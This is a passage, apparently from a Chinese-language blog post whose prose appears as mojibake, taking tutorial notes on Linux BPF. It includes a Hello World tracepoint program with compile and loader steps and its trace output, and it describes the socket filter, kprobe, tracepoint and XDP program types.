¸å¼€å‘äººå‘˜ä¸€ç›´åœ¨æ·»åŠ ä¸åŒçš„å…¥å£ç‚¹ï¼Œä½ å¯ä»¥å°† BPF ç¨‹åº<code>attach</code>åˆ°è¿™äº›å…¥å£ç‚¹ã€‚ è¿™é¡¹å·¥ä½œè¿˜æ²¡æœ‰å®Œæˆï¼Œä»–ä»¬æ¯å¤©éƒ½åœ¨å¯»æ‰¾åˆ©ç”¨BPFçš„æ–°æ–¹æ³•ã€‚ åœ¨æœ¬ç« ä¸­ï¼Œæˆ‘ä»¬å°†é‡ç‚¹ä»‹ç»ä¸€äº›æœ€æœ‰ç”¨çš„ç¨‹åºç±»å‹ï¼Œç›®çš„æ˜¯è®©ä½ äº†è§£ä½¿ç”¨BPFå¯ä»¥åšä»€ä¹ˆã€‚ æˆ‘ä»¬å°†åœ¨ä»¥åçš„ç« èŠ‚ä¸­è®¨è®ºå¦‚ä½•ç¼–å†™BPFç¨‹åºçš„è®¸å¤šå…¶ä»–ç¤ºä¾‹ã€‚</p><p>æœ¬ç« è¿˜å°†ä»‹ç»BPFéªŒè¯å™¨åœ¨è¿è¡Œç¨‹åºä¸­æ‰€æ‰®æ¼”çš„è§’è‰²ã€‚ è¯¥ç»„ä»¶éªŒè¯ä½ çš„ä»£ç æ˜¯å¦å¯ä»¥å®‰å…¨æ‰§è¡Œï¼Œå¹¶å¸®åŠ©ä½ ç¼–å†™ä¸ä¼šå¯¼è‡´æ„å¤–ç»“æœçš„ç¨‹åºï¼Œä¾‹å¦‚å†…å­˜è€—å°½æˆ–å†…æ ¸çªç„¶å´©æºƒã€‚ </p><h3 id="ç¼–å†™BPFç¨‹åº"><a href="#ç¼–å†™BPFç¨‹åº" class="headerlink" title="ç¼–å†™BPFç¨‹åº"></a>ç¼–å†™BPFç¨‹åº</h3><p>ç¼–å†™BPFç¨‹åºçš„æœ€å¸¸è§æ–¹æ³•æ˜¯ä½¿ç”¨<code>LLVM</code>ç¼–è¯‘çš„Cè¯­è¨€å­é›†ã€‚<code>LLVM</code>æ˜¯ä¸€ç§é€šç”¨ç¼–è¯‘å™¨ï¼Œå¯ä»¥è¾“å‡ºä¸åŒç±»å‹çš„å­—èŠ‚ç ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ<code>LLVM</code>å°†è¾“å‡ºBPFæ±‡ç¼–ä»£ç ï¼Œä¹‹åæˆ‘ä»¬ä¼šå°†ä»£ç åŠ è½½åˆ°å†…æ ¸ä¸­ã€‚æˆ‘ä»¬ä¼šåœ¨ä»¥åçš„ç« èŠ‚ä¸­å±•ç¤º BPFæ±‡ç¼–çš„ç®€çŸ­ç¤ºä¾‹ï¼Œç¼–å†™æ±‡ç¼–æ¯”Cè¯­è¨€æ›´åˆé€‚ï¼Œä¾‹å¦‚<code>Seccomp</code>è¿‡æ»¤å™¨æ¥æ§åˆ¶å†…æ ¸ä¸­çš„ä¼ å…¥ç³»ç»Ÿè°ƒç”¨ã€‚å†…æ ¸æä¾›ç³»ç»Ÿè°ƒç”¨bpfæ¥åœ¨ç¨‹åºç¼–è¯‘åå°†å®ƒä»¬åŠ è½½åˆ°BPFè™šæ‹Ÿæœºä¸­ã€‚ è¯¥ç³»ç»Ÿè°ƒç”¨ç”¨äºåŠ è½½ç¨‹åºä¹‹å¤–çš„å…¶ä»–æ“ä½œï¼Œä½ å°†åœ¨åé¢çš„ç« èŠ‚ä¸­çœ‹åˆ°æ›´å¤šä½¿ç”¨ç¤ºä¾‹ã€‚ å†…æ ¸è¿˜æä¾›äº†ä¸€äº›å®ç”¨å·¥å…·ï¼Œå¯ä»¥ä¸ºä½ æŠ½è±¡BPFç¨‹åºçš„åŠ è½½ã€‚åœ¨ç¬¬ä¸€ä¸ªä»£ç ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬å°†å±•ç¤ºBPFçš„â€œHello Worldâ€ç¤ºä¾‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEC(NAME) __attribute__((section(NAME), used))</span></span><br><span class="line"></span><br><span class="line">SEC(<span class="string">"tracepoint/syscalls/sys_enter_execve"</span>)</span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">bpf_prog</span><span class="params">(<span class="keyword">void</span> *ctx)</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> msg[] = <span class="string">"Hello, BPF World!"</span>; </span><br><span class="line">  bpf_trace_printk(msg, <span class="keyword">sizeof</span>(msg)); </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> _license[] SEC(<span class="string">"license"</span>) = <span class="string">"GPL"</span>;</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šé¢çš„ç¨‹åºä¸­æœ‰ä¸€äº›ç®€å•çš„æ¦‚å¿µã€‚å½“æˆ‘ä»¬æƒ³è¦è¿è¡Œè¿™ä¸ªç¨‹åºæ—¶ï¼Œæˆ‘ä»¬ä½¿ç”¨å±æ€§<code>SEC</code>æ¥é€šçŸ¥BPFè™šæ‹Ÿæœºã€‚åœ¨ä¸Šé¢BPFä¾‹å­ä¸­ï¼Œå½“æ£€æµ‹åˆ°<code>execve</code>ç³»ç»Ÿè°ƒç”¨ä¸­çš„è·Ÿè¸ªç‚¹æ—¶ï¼Œæˆ‘ä»¬å°†è¿è¡Œè¿™ä¸ªBPFç¨‹åºã€‚è·Ÿè¸ªç‚¹æ˜¯å†…æ ¸äºŒè¿›åˆ¶ä»£ç ä¸­çš„é™æ€æ ‡è®°ï¼Œå…è®¸å¼€å‘äººå‘˜æ³¨å…¥ä»£ç æ¥æ£€æŸ¥å†…æ ¸çš„æ‰§è¡Œã€‚æ‰€ä»¥æˆ‘ä»¬å°†çœ‹åˆ°æ¶ˆæ¯<code>Helloï¼ŒBPF Worldï¼</code>æ¯å½“å†…æ ¸æ£€æµ‹åˆ°ä¸€ä¸ªç¨‹åºæ‰§è¡Œå¦ä¸€ä¸ªç¨‹åºæ—¶ã€‚</p><p>åœ¨è¿™ä¸ªä¾‹å­çš„æœ€åï¼Œæˆ‘ä»¬è¿˜æŒ‡å®šäº†è¿™ä¸ªç¨‹åºçš„è®¸å¯è¯ã€‚å› ä¸ºLinuxå†…æ ¸æ˜¯åœ¨GPLä¸‹è·å¾—è®¸å¯çš„ï¼Œæ‰€ä»¥å®ƒä¹Ÿåªèƒ½åŠ è½½è·å¾—GPLè®¸å¯çš„ç¨‹åºã€‚ å¦‚æœæˆ‘ä»¬å°†è®¸å¯è¯è®¾ç½®ä¸ºå…¶ä»–å†…å®¹ï¼Œå†…æ ¸å°†æ‹’ç»åŠ è½½æˆ‘ä»¬çš„ç¨‹åºã€‚æˆ‘ä»¬æ­£åœ¨ä½¿ç”¨    <code>bpf_trace_printk</code>åœ¨å†…æ ¸è·Ÿè¸ªæ—¥å¿—ä¸­æ‰“å°ä¸€æ¡æ¶ˆæ¯ï¼› è¯¥æ¶ˆæ¯ä½ å¯ä»¥åœ¨<code>/sys/kernel/debug/tracing/trace_pipe</code>è·¯å¾„ä¸‹æ‰¾åˆ°æ­¤æ—¥å¿—ã€‚</p><p>æˆ‘ä»¬å°†ä½¿ç”¨<code>Clang</code>å°†ç¬¬ä¸€ä¸ªç¨‹åºç¼–è¯‘ä¸ºæœ‰æ•ˆçš„ELFäºŒè¿›åˆ¶æ–‡ä»¶ã€‚è¿™æ˜¯å†…æ ¸æœŸæœ›åŠ è½½çš„æ ¼å¼ã€‚æˆ‘ä»¬å°†æŠŠæˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªç¨‹åºä¿å­˜åœ¨ä¸€ä¸ªåä¸º<code>bpf_program.c</code>çš„æ–‡ä»¶ä¸­ï¼Œä»¥ä¾¿ç¼–è¯‘å®ƒï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -O2 -target bpf -c bpf_program.c -o bpf_program.o</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œç¼–è¯‘çš„æ—¶å€™é‡åˆ°äº†ä¸€ä¸ªé”™è¯¯ã€‚å…·ä½“æŠ¥é”™å¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bpf_program.c:7:3: warning: implicit declaration of function 'bpf_trace_printk' is invalid in C99 [-Wimplicit-function-declaration]</span><br><span class="line">  bpf_trace_printk(msg, sizeof(msg)); </span><br><span class="line">  ^</span><br><span class="line">1 warning generated.</span><br></pre></td></tr></table></figure><p>è§£å†³æ–¹æ³•ï¼š<a href="https://github.com/iovisor/gobpf/issues/267" target="_blank" rel="noopener">https://github.com/iovisor/gobpf/issues/267</a></p><p>é‡æ–°ç¼–è¯‘å¾—åˆ°<code>bpf_program.o</code>æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -O2 -target bpf -c bpf_program.c -I bpf_helpers.h -o bpf_program.o</span><br></pre></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬å·²ç»ç¼–è¯‘äº†ç¬¬ä¸€ä¸ªBPFç¨‹åºï¼Œéœ€è¦å°†å®ƒåŠ è½½åˆ°å†…æ ¸ä¸­ã€‚æˆ‘ä»¬ä½¿ç”¨å†…æ ¸æä¾›çš„ç‰¹æ®Šå¸®åŠ©å™¨æ¥æŠ½è±¡ç¼–è¯‘å’ŒåŠ è½½ç¨‹åºã€‚è¿™ä¸ªå¸®åŠ©ç¨‹åºç§°ä¸º<code>load_bpf_file</code>ï¼Œå®ƒéœ€è¦ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶å¹¶å°è¯•å°†å…¶åŠ è½½åˆ°å†…æ ¸ä¸­ã€‚ç¨‹åºä»£ç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;uapi/linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"bpf_load.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (load_bpf_file(<span class="string">"bpf_program.o"</span>) != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The kernel didn't load the BPF program\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>; </span><br><span class="line">&#125;</span><br><span class="line">read_trace_pipe(); </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°†ä½¿ç”¨è„šæœ¬æ¥ç¼–è¯‘è¯¥ç¨‹åºå¹¶å°†å…¶é“¾æ¥ä¸ºELFäºŒè¿›åˆ¶æ–‡ä»¶ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¸éœ€è¦æŒ‡å®šç›®æ ‡ï¼Œå› ä¸ºè¯¥ç¨‹åºä¸ä¼šåŠ è½½åˆ°BPFè™šæ‹Ÿæœºä¸­ã€‚ æˆ‘ä»¬éœ€è¦ä½¿ç”¨ä¸€ä¸ªå¤–éƒ¨åº“ï¼Œå¹¶ä¸”ç¼–å†™ä¸€ä¸ªè„šæœ¬å¯ä»¥æ›´å®¹æ˜“åœ°å°†å®ƒä»¬æ”¾åœ¨ä¸€èµ·ã€‚</p><p>å…·ä½“çš„æ‰§è¡Œæµç¨‹å¦‚ä¸‹é“¾æ¥æ‰€ç¤º</p><p><a href="https://github.com/bpftools/linux-observability-with-bpf/tree/master/code/chapter-2/hello_world" target="_blank" rel="noopener">https://github.com/bpftools/linux-observability-with-bpf/tree/master/code/chapter-2/hello_world</a></p><p>è¿™é‡Œéœ€è¦æ³¨æ„åœ¨Makefileä¸­éœ€è¦å°†<code>kernel-src</code>ä¿®æ”¹ä¸ºä½ çš„å†…æ ¸æºä»£ç è·¯å¾„</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bpf]# make bpfload</span><br><span class="line">clang -O2 -target bpf -c bpf_program.c -I/root/linux-5.4/tools/testing/selftests/bpf -o bpf_program.o</span><br><span class="line">clang -DHAVE_ATTR_TEST=0 -o monitor-exec -lelf -I/root/linux-5.4/samples/bpf -I/root/linux-5.4/tools/lib -I/root/linux-5.4/tools/perf -I/root/linux-5.4/tools/include -L/usr/local/lib64 -lbpf \</span><br><span class="line">        /root/linux-5.4/samples/bpf/bpf_load.c loader.c</span><br><span class="line">[root@VM-16-14-centos bpf]# ls</span><br><span class="line">Makefile  bpf_helpers.h  bpf_program.c  bpf_program.o  loader.c  monitor-exec</span><br></pre></td></tr></table></figure><p>å½“ä½ è¿è¡Œè¿™ä¸ªç¨‹åºæ—¶ï¼Œä½ ä¼šå¼€å§‹çœ‹åˆ°æˆ‘ä»¬çš„Hello, BPF Worldï¼ å‡ ç§’é’Ÿåçš„æ¶ˆæ¯ï¼Œå³ä½¿æ‚¨æ²¡æœ‰å¯¹è®¡ç®—æœºæ‰§è¡Œä»»ä½•æ“ä½œã€‚ è¿™æ˜¯å› ä¸ºåœ¨æ‚¨çš„è®¡ç®—æœºåå°è¿è¡Œçš„ç¨‹åºå¯èƒ½æ­£åœ¨æ‰§è¡Œå…¶ä»–è°ƒç”¨äº†<code>execve</code>çš„ç¨‹åºã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bpf]# ./monitor-exec </span><br><span class="line">     barad_agent-20064   [000] d..31  7270.907178: bpf_trace_printk: Hello, BPF World!</span><br><span class="line"></span><br><span class="line">              sh-20067   [000] d..31  7270.909399: bpf_trace_printk: Hello, BPF World!</span><br><span class="line"></span><br><span class="line">              sh-20066   [000] d..31  7270.910152: bpf_trace_printk: Hello, BPF World!</span><br><span class="line"></span><br><span class="line">              sh-20065   [000] d..31  7270.912163: bpf_trace_printk: Hello, BPF World!</span><br><span class="line"></span><br><span class="line">     barad_agent-20069   [000] d..31  7273.905863: bpf_trace_printk: Hello, BPF World!</span><br><span class="line"></span><br><span class="line">              sh-20069   [000] d..31  7273.907699: bpf_trace_printk: Hello, BPF World!</span><br><span class="line"></span><br><span class="line">     barad_agent-20070   [000] d..31  7273.909361: bpf_trace_printk: Hello, BPF World!</span><br><span class="line"></span><br><span class="line">              sh-20072   [000] d..31  7273.911010: bpf_trace_printk: Hello, BPF World!</span><br><span class="line"></span><br><span class="line">              sh-20071   [000] d..31  7273.912147: bpf_trace_printk: Hello, BPF World!</span><br></pre></td></tr></table></figure><p>å½“æ‚¨åœæ­¢æ­¤ç¨‹åºæ—¶ï¼Œè¯¥æ¶ˆæ¯å°†åœæ­¢æ˜¾ç¤ºåœ¨æ‚¨çš„ç»ˆç«¯ä¸­ã€‚ ä¸€æ—¦åŠ è½½ BPF ç¨‹åºçš„ç¨‹åºç»ˆæ­¢ï¼ŒBPF ç¨‹åºå°±ä¼šä»è™šæ‹Ÿæœºä¸­å¸è½½ã€‚åœ¨æ¥ä¸‹æ¥çš„ç« èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†æ¢è®¨å¦‚ä½•ä½¿BPFç¨‹åºæŒä¹…åŒ–ï¼Œå³ä½¿å®ƒä»¬çš„åŠ è½½å™¨ç»ˆæ­¢ä¹‹åï¼Œå› ä¸ºåœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šå¸Œæœ›BPFç¨‹åºåœ¨åå°è¿è¡Œï¼Œä»ç³»ç»Ÿä¸­æ”¶é›†æ•°æ®ï¼Œè€Œä¸ç®¡å…¶ä»–è¿›ç¨‹æ˜¯å¦æ­£åœ¨è¿è¡Œã€‚ç°åœ¨æˆ‘ä»¬å·²ç»äº†è§£äº†BPFç¨‹åºçš„åŸºæœ¬ç»“æ„ï¼Œæ¥ä¸‹æ¥å¯ä»¥æ·±å…¥äº†è§£æˆ‘ä»¬èƒ½å¤Ÿç¼–å†™å“ªäº›ç±»å‹çš„ç¨‹åºï¼Œä»è€Œä½¿å¾—æˆ‘ä»¬èƒ½å¤Ÿè®¿é—®Linuxå†…æ ¸ä¸­çš„ä¸åŒå­ç³»ç»Ÿã€‚</p><h3 id="BPFç¨‹åºç±»å‹"><a href="#BPFç¨‹åºç±»å‹" class="headerlink" title="BPFç¨‹åºç±»å‹"></a>BPFç¨‹åºç±»å‹</h3><p>å°½ç®¡ç¨‹åºä¸­æ²¡æœ‰æ˜ç¡®çš„åˆ†ç±»ï¼Œä½†æˆ‘ä»¬å¯ä»¥å°†æ‰€æœ‰ç±»å‹åˆ†ä¸ºä¸¤ç±»ï¼Œå…·ä½“å–å†³äºå®ƒä»¬çš„ä¸»è¦ç”¨é€”ã€‚</p><p>ç¬¬ä¸€ç±»æ˜¯è¿½è¸ª(tracing)ã€‚ ç¼–å†™çš„ç¨‹åºä¼šå¸®åŠ©ä½ æ›´å¥½åœ°äº†è§£ç³»ç»Ÿä¸­æ­£åœ¨å‘ç”Ÿçš„äº‹æƒ…ã€‚å®ƒä»¬ä¸ºä½ æä¾›æœ‰å…³ç³»ç»Ÿè¡Œä¸ºåŠå…¶è¿è¡Œçš„ç¡¬ä»¶çš„ç›´æ¥ä¿¡æ¯ã€‚ å®ƒä»¬å¯ä»¥è®¿é—®ä¸ç‰¹å®šç¨‹åºç›¸å…³çš„å†…å­˜åŒºåŸŸï¼Œå¹¶ä»æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ä¸­æå–æ‰§è¡Œè·Ÿè¸ªä¿¡æ¯ã€‚ å®ƒä»¬è¿˜ä½¿ä½ å¯ä»¥ç›´æ¥è®¿é—®ä¸ºæ¯ä¸ªç‰¹å®šè¿›ç¨‹åˆ†é…çš„èµ„æºï¼Œä»æ–‡ä»¶æè¿°ç¬¦åˆ°CPUå’Œå†…å­˜çš„ä½¿ç”¨æƒ…å†µã€‚</p><p>ç¬¬äºŒç±»æ˜¯ç½‘ç»œ(networking)ã€‚ è¿™äº›ç±»å‹çš„ç¨‹åºå…è®¸ä½ æ£€æŸ¥å’Œæ“ä½œç³»ç»Ÿä¸­çš„ç½‘ç»œæµé‡ã€‚å®ƒä»¬è®©ä½ è¿‡æ»¤æ¥è‡ªç½‘ç»œæ¥å£çš„æ•°æ®åŒ…ï¼Œç”šè‡³å®Œå…¨æ‹’ç»è¿™äº›æ•°æ®åŒ…ã€‚ä¸åŒç±»å‹çš„ç¨‹åºå¯ä»¥é™„ç€(attach)åˆ°å†…æ ¸å†…ç½‘ç»œå¤„ç†çš„ä¸åŒé˜¶æ®µã€‚ è¿™æœ‰ä¼˜ç‚¹ä¹Ÿæœ‰ç¼ºç‚¹ã€‚ä¾‹å¦‚ï¼Œä½ å¯ä»¥åœ¨ç½‘ç»œé©±åŠ¨ç¨‹åºæ¥æ”¶åˆ°æ•°æ®åŒ…åç«‹å³å°†BPFç¨‹åºé™„ç€åˆ°ç½‘ç»œäº‹ä»¶ï¼Œä½†æ˜¯è¯¥ç¨‹åºå°†è®¿é—®çš„æœ‰å…³æ•°æ®åŒ…çš„ä¿¡æ¯è¾ƒå°‘ï¼Œå› ä¸ºå†…æ ¸è¿˜æ²¡æœ‰è¶³å¤Ÿçš„ä¿¡æ¯æ¥æä¾›ç»™ä½ ã€‚å¦ä¸€æ–¹é¢ï¼Œæ‚¨å¯ä»¥åœ¨ BPF ç¨‹åºè¢«ä¼ é€’åˆ°ç”¨æˆ·ç©ºé—´ä¹‹å‰ç«‹å³å°†å®ƒä»¬é™„åŠ åˆ°ç½‘ç»œäº‹ä»¶ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½ å¯ä»¥è·å¾—æœ‰å…³æ•°æ®åŒ…çš„æ›´å¤šä¿¡æ¯ï¼Œè¿™ä¼šå¸®åŠ©ä½ åšå‡ºæ›´å¥½çš„å†³ç­–ï¼Œä½†æ˜¯è¿™æ ·å¤„ç†æˆæœ¬è¾ƒé«˜ã€‚</p><p>æˆ‘ä»¬æ¥ä¸‹æ¥å±•ç¤ºçš„ç¨‹åºç±»å‹æ²¡æœ‰åˆ†ç±»ã€‚æˆ‘ä»¬æŒ‰ç…§å®ƒä»¬è¢«æ·»åŠ åˆ°å†…æ ¸çš„æ—¶é—´é¡ºåºæ¥ä»‹ç»è¿™äº›ç±»å‹ã€‚ </p><h4 id="Socket-Filterç¨‹åº"><a href="#Socket-Filterç¨‹åº" class="headerlink" title="Socket Filterç¨‹åº"></a>Socket Filterç¨‹åº</h4><p><code>BPF_PROG_TYPE_SOCKET_FILTER</code>æ˜¯ç¬¬ä¸€ä¸ªæ·»åŠ åˆ°Linuxå†…æ ¸çš„ç¨‹åºç±»å‹ã€‚å½“BPFç¨‹åºé™„ç€åˆ°åŸå§‹å¥—æ¥å­—æ—¶ï¼Œä½ å¯ä»¥è®¿é—®è¯¥å¥—æ¥å­—å¤„ç†çš„æ‰€æœ‰æ•°æ®åŒ…ã€‚å¥—æ¥å­—è¿‡æ»¤ç¨‹åºä¸å…è®¸ä¿®æ”¹è¿™äº›æ•°æ®åŒ…çš„å†…å®¹æˆ–æ›´æ”¹è¿™äº›æ•°æ®åŒ…çš„ç›®çš„åœ°ï¼Œå®ƒä»¬ä»…å…è®¸ä½ å‡ºäºå¯è§‚å¯Ÿæ€§ç›®çš„è®¿é—®å®ƒä»¬ã€‚ä½ çš„ç¨‹åºæ¥æ”¶çš„å…ƒæ•°æ®åŒ…å«ä¸ç½‘ç»œå †æ ˆç›¸å…³çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ç”¨äºä¼ é€’æ•°æ®åŒ…çš„åè®®ç±»å‹ç­‰ã€‚</p><h4 id="Kprobeç¨‹åº"><a href="#Kprobeç¨‹åº" class="headerlink" title="Kprobeç¨‹åº"></a>Kprobeç¨‹åº</h4><p><code>kprobes</code>æ˜¯å¯ä»¥åŠ¨æ€é™„åŠ åˆ°å†…æ ¸ä¸­æŸäº›è°ƒç”¨ç‚¹çš„å‡½æ•°ã€‚<code>BPF kprobe</code>ç¨‹åºç±»å‹å…è®¸ä½ å°†BPFç¨‹åºç”¨ä½œ<code>kprobe</code>å¤„ç†ç¨‹åºã€‚ å®ƒä»¬ä½¿ç”¨<code>BPF_PROG_TYPE_KPROBE</code>ç±»å‹å®šä¹‰ã€‚BPFè™šæ‹Ÿæœºç¡®ä¿<code>kprobe</code>ç¨‹åºå§‹ç»ˆå¯ä»¥å®‰å…¨è¿è¡Œï¼Œè¿™æ˜¯ä¼ ç»Ÿ<code>kprobe</code>æ¨¡å—çš„ä¼˜åŠ¿ã€‚ è¿™é‡Œéœ€è¦å¼ºè°ƒçš„æ˜¯ï¼Œ<code>kprobe</code>ä¸æ˜¯å†…æ ¸ä¸­çš„ç¨³å®šå…¥å£ç‚¹ï¼Œæ‰€ä»¥ä½ éœ€è¦ç¡®ä¿<code>kprobe BPF</code>ç¨‹åºä¸ä½ æ­£åœ¨ä½¿ç”¨çš„ç‰¹å®šå†…æ ¸ç‰ˆæœ¬å…¼å®¹ã€‚</p><p>å½“ä½ ç¼–å†™ä¸€ä¸ªé™„ç€åˆ°<code>kprobe</code>çš„BPFç¨‹åºæ—¶ï¼Œä½ éœ€è¦å†³å®šå®ƒæ˜¯ä½œä¸ºå‡½æ•°è°ƒç”¨ä¸­çš„ç¬¬ä¸€æ¡æŒ‡ä»¤æ‰§è¡Œè¿˜æ˜¯åœ¨è°ƒç”¨å®Œæˆæ—¶æ‰§è¡Œã€‚ä½ éœ€è¦åœ¨BPFç¨‹åºçš„èŠ‚å¤´ä¸­å£°æ˜æ­¤è¡Œä¸ºã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ æƒ³åœ¨å†…æ ¸è°ƒç”¨<code>exec</code>ç³»ç»Ÿè°ƒç”¨æ—¶æ£€æŸ¥å‚æ•°ï¼Œä½ å°†åœ¨è°ƒç”¨å¼€å§‹æ—¶é™„åŠ ç¨‹åºï¼Œè¿™ä¸ªæ—¶å€™éœ€è¦åœ¨å¤´éƒ¨æ·»åŠ <code>SEC(&quot;kprobe/sys_exec&quot;)</code>ã€‚å¦‚æœè¦æ£€æŸ¥è°ƒç”¨<code>exec</code>ç³»ç»Ÿè°ƒç”¨çš„è¿”å›å€¼ï¼Œåˆ™éœ€è¦åœ¨å¤´éƒ¨æ·»åŠ <code>SEC(&quot;kretprobe/sys_exec&quot;)</code>ã€‚</p><h4 id="Tracepointç¨‹åº"><a href="#Tracepointç¨‹åº" class="headerlink" title="Tracepointç¨‹åº"></a>Tracepointç¨‹åº</h4><p>è¿™ç§ç±»å‹çš„ç¨‹åºå…è®¸å°†BPFç¨‹åºé™„ç€åˆ°å†…æ ¸æä¾›çš„è·Ÿè¸ªç‚¹å¤„ç†ç¨‹åºã€‚è·Ÿè¸ªç‚¹ç¨‹åºä½¿ç”¨<code>BPF_PROG_TYPE_TRACEPOINT</code>ç±»å‹å®šä¹‰ã€‚è·Ÿè¸ªç‚¹æ˜¯å†…æ ¸ä»£ç åº“ä¸­çš„é™æ€æ ‡è®°ï¼Œå…è®¸æ³¨å…¥ä»»æ„ä»£ç è¿›è¡Œè·Ÿè¸ªå’Œè°ƒè¯•ã€‚å®ƒä»¬ä¸å¦‚<code>kprobes</code>çµæ´»ï¼Œå› ä¸ºå®ƒä»¬éœ€è¦äº‹å…ˆç”±å†…æ ¸å®šä¹‰ï¼Œä½†åœ¨å¼•å…¥å†…æ ¸åå°±æ˜¯ç¨³å®šçš„ã€‚ å½“ä½ æƒ³è¦è°ƒè¯•ç³»ç»Ÿæ—¶ï¼Œè¿™ç§æ–¹æ³•æä¾›äº†æ›´é«˜çº§åˆ«çš„å¯é¢„æµ‹æ€§ã€‚</p><p>ç³»ç»Ÿä¸­çš„æ‰€æœ‰è·Ÿè¸ªç‚¹éƒ½å®šä¹‰åœ¨ç›®å½•<code>/sys/kernel/debug/tracing/events</code>ä¸­ã€‚åœ¨è¯¥ç›®å½•ä¸‹ï¼Œæ¯ä¸ªå­ç³»ç»Ÿéƒ½åŒ…å«ä»»ä½•è·Ÿè¸ªç‚¹ï¼Œå¹¶ä¸”å¯ä»¥å°†BPFç¨‹åºé™„ç€åˆ°è¿™äº›å­ç³»ç»Ÿã€‚BPFè·Ÿè¸ªç‚¹åœ¨<code>/sys/kernel/debug/tracing/events/bpf</code>ä¸­å®šä¹‰ã€‚ ä¾‹å¦‚ï¼Œå¯ä»¥åœ¨æ­¤å¤„æ‰¾åˆ°<code>bpf_prog_load</code>çš„è·Ÿè¸ªç‚¹å®šä¹‰ã€‚ è¿™æ„å‘³ç€ä½ å¯ä»¥ç¼–å†™ä¸€ä¸ªBPFç¨‹åºæ¥æ£€æŸ¥å…¶ä»–BPFç¨‹åºä½•æ—¶åŠ è½½ã€‚</p><h4 id="XDPç¨‹åº"><a href="#XDPç¨‹åº" class="headerlink" title="XDPç¨‹åº"></a>XDPç¨‹åº</h4><p>XDPç¨‹åºå…è®¸ä½ ç¼–å†™åœ¨ç½‘ç»œæ•°æ®åŒ…åˆ°è¾¾å†…æ ¸æ—¶å°±æ‰§è¡Œçš„ä»£ç ã€‚ å®ƒä»¬ä½¿ç”¨<code>BPF_PROG_TYPE_XDP</code>ç±»å‹å®šä¹‰ã€‚ é‰´äºå†…æ ¸æ²¡æœ‰å¤ªå¤šæ—¶é—´æ¥å¤„ç†ä¿¡æ¯æœ¬èº«ï¼Œå®ƒåªä»æ•°æ®åŒ…ä¸­å…¬å¼€ä¸€ç»„æœ‰é™çš„ä¿¡æ¯ã€‚ å› ä¸ºæ•°æ®åŒ…æ˜¯åœ¨æ—©æœŸæ‰§è¡Œçš„ï¼Œæ‰€ä»¥ä½ å¯¹å¦‚ä½•å¤„ç†è¯¥æ•°æ®åŒ…æœ‰æ›´é«˜çº§åˆ«çš„æ§åˆ¶ã€‚</p><p>XDPç¨‹åºå®šä¹‰äº†å‡ 